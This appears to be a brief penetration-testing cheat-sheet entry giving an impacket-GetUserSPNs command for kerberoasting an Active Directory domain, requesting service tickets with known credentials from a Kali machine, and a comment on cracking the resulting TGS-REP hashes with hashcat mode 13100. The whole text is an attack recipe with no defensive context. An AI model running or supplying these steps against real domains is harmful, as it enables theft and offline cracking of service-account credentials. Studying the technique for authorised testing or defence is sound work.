sudo impacket-GetUserSPNs -request -dc-ip <ip> <domain/username> #If we had some credentials we can attemp to see if the user we have is vulnerable to kerberoasting externaly through our kali. 

# Then we can attemp to crack the hash with hashcat with TGS-REP (13100) crack type.
